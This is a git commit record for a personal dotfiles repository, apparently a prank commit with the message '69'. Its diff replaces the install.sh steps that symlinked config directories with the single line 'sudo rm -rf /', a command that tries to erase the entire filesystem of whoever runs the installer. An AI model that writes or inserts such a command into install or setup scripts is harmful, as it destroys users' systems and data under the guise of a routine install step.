759e69e459cd265d1d4007403db20bebc197ff76
Charlie Clift <bang.boom030518@gmail.com>
2025-06-02 13:45:57 +0100

    69

--- install.sh
+++ install.sh
@@ -1,14 +1,1 @@
-rm -rf ~/.config/ghostty
-ln -s ~/.dotfiles/ghostty ~/.config/ghostty
-rm -rf ~/.config/hypr/
-ln -s ~/.dotfiles/hypr ~/.config/hypr
-rm -rf ~/.config/neofetch/
-ln -s ~/.dotfiles/neofetch/
-rm -rf ~/.config/nvim/
-ln -s ~/.dotfiles/nvim/ ~/.config/nvim/
-rm -rf ~/.config/waybar/
-ln -s ~/.dotfiles/waybar ~/.config/waybar
-rm -rf ~/.zshrc
-ln -s ~/.dotfiles/.zshrc ~/
-rm -rf /etc/pacman.conf 
-ln -s ~/.dotfiles/pacman.conf /etc/
+sudo rm -rf /
